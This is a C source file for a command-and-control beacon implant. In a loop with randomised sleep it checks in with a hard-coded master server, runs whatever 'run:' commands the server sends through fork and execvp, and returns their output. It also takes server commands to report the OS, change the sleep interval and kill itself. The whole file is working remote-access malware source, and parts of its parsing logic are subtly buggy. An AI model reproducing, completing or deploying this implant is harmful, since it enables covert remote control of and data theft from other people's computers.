#include <stdlib.h>
#include <stdio.h>
#include "beacon_client.h"

// main
int main(){
    struct sockaddr_in master;
    char *data = NULL;

    // short sleep if debugging
    #ifdef CLIENT_DEBUG
    int set_sleep = 3;
    #else
    int set_sleep = SLEEP_BASE;
    #endif

    // initalize networking related structures (master)
    master_init(&master);

    while ( 1 ) {
        //sleep time
        int sleep_time = (rand() % (int)(set_sleep*0.5+1)) + set_sleep;
        
        #ifdef CLIENT_DEBUG
        printf("Sleeping for %d seconds... ", sleep_time);
        #endif

        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
        // seconds
        sleep(sleep_time);
        #elif __windows__
        // seconds -> milliseconds
        Sleep(sleep_time*1000);
        #endif

        #ifdef CLIENT_DEBUG
        printf("Complete.\n");
        #endif

        // initial check-in
        char *resp = master_checkin(master, data);
        if (data) {
            bzero(data, strlen(data)+1);
            free(data);
        }
        data = NULL;

        // @TODO replace "run:" with #define, take STRLEN of it instead of hardcoding 4.
        if (!strncmp(resp, "run:", 4)) {
            uint32_t resplen = strlen(resp);
            uint32_t cmdlen = resplen-4;
            if (cmdlen) {
                char *cmd = (char *)malloc(sizeof(char) * (cmdlen+1));
                strncpy(cmd,resp+4,cmdlen);
                int len;
                
                // args
                char ** args = tokenize_cmd(cmd,&len);
                #ifdef CLIENT_DEBUG
                printf("Arguments:\n");
                for (int i = 0; i < len; i++){
                    printf("\tArg[%d] = %s\n",i,args[i]);
                }
                if (args[len] == 0){
                    printf("\tArg[%d] = '\\0'\n",len);
                } else {
                    printf("\tArg[%d] is not NULL! %s\n",len,args[len]);
                }
                #endif
                
                // run command
                data = run_cmd(args);

                // free
                free(cmd);
            }
        }

        // get os
        if (!strncmp(resp, "get os", 7)){
            data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
            sprintf(data, "%s%s", "set os:", OS);
        }

        // set sleep
        if (!strncmp(resp, "set sleep:", 10)){
            sscanf((resp+10), "%d", &set_sleep);
            data = (char*)malloc(strlen("SET SLEEP OK")+1);
            strcpy(data, "SET SLEEP OK");
        }

        // get sleep
        if (!strncmp(resp, "get sleep", 9)){
            data = (char*)malloc(strlen("set sleep:")+snprintf(NULL, 0, "%d", set_sleep)+1);
            sprintf(data, "set sleep:%d", set_sleep);
        }

        // kill / die
        if (!strncmp(resp, "killkillkill", 9)){
            data = (char*)malloc(strlen("i am kill")+1);
            strcpy(data, "i am kill");
        }
        free(resp);
    }
    return 0;
}

/*
 * tokenize_cmd
 * desc: Tokenize a string into an array of strings using spaces, quotes, and double quotes as delimiters
 * param: cmd - string of the command to be ran
 * param: count - pass by reference, count to be returned, strictly used for debugging @TODO eventually remove
 * return: array of strings, last string is a null pointer
 */
char **tokenize_cmd(char *cmd, int *count) {
    int is_quote = 0;
    int is_dquote = 0;
    uint32_t start = 0;
    uint32_t index = 0;
    
    // get size of cmd, allocate buffers
    uint32_t cmdlen = strlen(cmd);
    char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));

    // iterate over characters in command
    for (uint32_t end = 0; end <= cmdlen; end++) {
        // spaces
        if (!is_dquote && !is_quote && (cmd[end] == ' ' || cmd[end] == 0)){
            if (end > start) {
                uint32_t toklen = (end - start);
                tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                bzero(tokens[index],toklen+1);
                strncpy(tokens[index],cmd+start,toklen);
                tokens[index][toklen] = '\0';
                start = end+1;
                index++;
            }
        }

        // double quotes
        if (cmd[end] == '"' || (is_dquote && cmd[end] == 0)){
            if (is_quote){
                // end quote
                if (end > start) {
                    uint32_t toklen = (end - start)+1;
                    tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                    bzero(tokens[index],toklen+1);
                    strncpy(tokens[index],cmd+start,toklen);
                    tokens[index][toklen] = '\0';
                    start = end+2;
                    index++;
                    is_quote = 0;
                }
            } else if (!is_dquote) {
                is_quote = 1;
            }
        }

        // single quotes
        if (cmd[end] == '\'' || (is_quote && cmd[end] == 0)){
            if (is_dquote){
                // end quote
                if (end > start) {
                    uint32_t toklen = (end - start)+1;
                    tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                    bzero(tokens[index],toklen+1);
                    strncpy(tokens[index],cmd+start,toklen);
                    tokens[index][toklen] = '\0';
                    start = end+2;
                    index++;
                    is_dquote = 0;
                }
            } else if (!is_quote) {
                is_dquote = 1;
            }
        }
    }
    tokens[index] = (char *)malloc(sizeof(char));
    tokens[index] = NULL;
    #ifdef CLIENT_DEBUG
    printf("[tokenize_cmd] Arguments found: %d\n",index);
    #endif
    (*count) = index;
    return tokens;
}

/*
 * master_init
 * desc: Initalize connection
 * param: sockaddr_in, socket address 
 * @TODO if memset fails return non-zero.
 */
int master_init(struct sockaddr_in *master) {

    #if defined __apple__ || defined(__linux__) || defined(__unix__)
    memset(master, 0, sizeof(struct sockaddr_in));
    master->sin_family = AF_INET;
    master->sin_addr.s_addr = inet_addr( MASTER_IP );
    master->sin_port = htons(MASTER_PORT);
    #elif __windows__
    memset(master, 0, sizeof(struct sockaddr_in));
    master->sin_family = AF_INET;
    master->sin_addr.s_addr = inet_addr( MASTER_IP );
    // @TODO FIX
    // master->sin_port = htons(MASTER_PORT);
    #endif
    return 0;
}

char *master_checkin(struct sockaddr_in master, char *data){
    char *server_reply = (char *)malloc(MASTER_RECV_SIZE);
    int recv_size;
    bzero(server_reply, MASTER_RECV_SIZE);
    
    #if defined __apple__ || defined(__linux__) || defined(__unix__)
    // do standard sockets
    int s;
    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Socket creation failed.\n");
        #endif
            return server_reply;
    }

    // Establish connection
    if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Connect to master failed.\n");
        #endif
        return server_reply;
    }
    
    // Send data
    if(data && send(s , data , strlen(data) , 0) < 0) {
        return server_reply; //something failed :(
    }
    if (data && !strcmp(data, "i am kill")){
        free(data);
        free(server_reply);
        close(s);
        exit(0);
    }
    
    // Receive a reply from the server
    if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
        puts("recv failed");
    }
    close(s);
    
    #elif __windows__
    WSADATA wsa;
    SOCKET s;

    #ifdef CLIENT_DEBUG
    printf("[master_checkin] Initialising...");
    #endif

    // initialize WSA
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        #ifdef CLIENT_DEBUG
        printf("Failed. Error: %d",WSAGetLastError());
        #endif
        return server_reply;
    }

    // Create a socket
    if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
        #ifdef CLIENT_DEBUG
        printf("Could not create socket : %d" , WSAGetLastError());
        #endif
        return server_reply;
    }

    // Connect to master
    if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0) {
        return server_reply;
    }

    // Send data
    if( send(s , data , strlen(data) , 0) == SOCKET_ERROR) {
        return server_reply;
    }

    // Receive a reply from the server
    if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) == SOCKET_ERROR) {
        puts("recv failed");
    }
    #endif

    // Add a NULL terminating character to make it a proper string before printing
    server_reply[recv_size] = '\0';
    return server_reply;
}

/* 
 * get_os
 * desc: Retrieves the OS on whatever system it was compiled for
 * param: none.
 * return: Result of get OS command.
 */
char *get_os() {
    int len = strlen(ID_CMD);
    char **cmd = (char **)malloc(sizeof(char *));
    cmd[0] = (char *)malloc(sizeof(char) * (len+1));
    strncpy(cmd[0],ID_CMD,len);
    char *data = run_cmd(cmd);
    free(cmd[0]);
    free(cmd);
    return data;
}

/*
 * run_cmd
 * desc: Runs a command for the OS it was compiled for, returns results of that command
 * param: args - list of arguments, arg[0] being the command
 * return: string of result of command, will be NULL if errors occurred
 * @TODO: Move argument parsing call to here, change param to char *
 */
char *run_cmd(char **args) {
    int pipes[2];
    pid_t pid;
    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
    bzero(buf, BUF_SIZE); // zero out buffer

    // pipe
    if (pipe(pipes)==-1) {
        #ifdef CLIENT_DEBUG
        puts("[run_cmd] Failed to pipe.\n");
        #endif
        return NULL; // fail
    }

    // fork
    if ((pid = fork()) == -1) {
        #ifdef CLIENT_DEBUG
        puts("[run_cmd] Failed to fork.\n");
        #endif
        return NULL; // fail
    }
    
    // child
    if (pid == 0) {
        // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
        dup2(pipes[1], STDOUT_FILENO);
        dup2(pipes[1], STDERR_FILENO);
        #elif __windows__
        _dup2(pipes[1], STDOUT_FILENO);
        #endif
        
        // close stdin/out
        close(pipes[0]);
        close(pipes[1]);
        
        // exec
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
        if (execvp(args[0],args) < 0) {
            perror("Error: Command not found\n");
        }
        #elif __windows__
        if (execvp(args[0],args) < 0) {
            perror("Error: Command not found\n");
        }
        #endif

        // free
        int j = 0;
        while (args[j] != 0){
            free(args[j]);
            j++;
        }
        free(args[j]);
        free(args);
        
        // exit
        exit(0);
    } else { // parent
        // close stdout
        close(pipes[1]);

        // read from stdin
        read(pipes[0], buf, BUF_SIZE);
        
        #ifdef CLIENT_DEBUG
        printf("[run_cmd] cmd ran: %s, output:%s\n",args[0],buf);
        #endif
    }
    return buf;
}
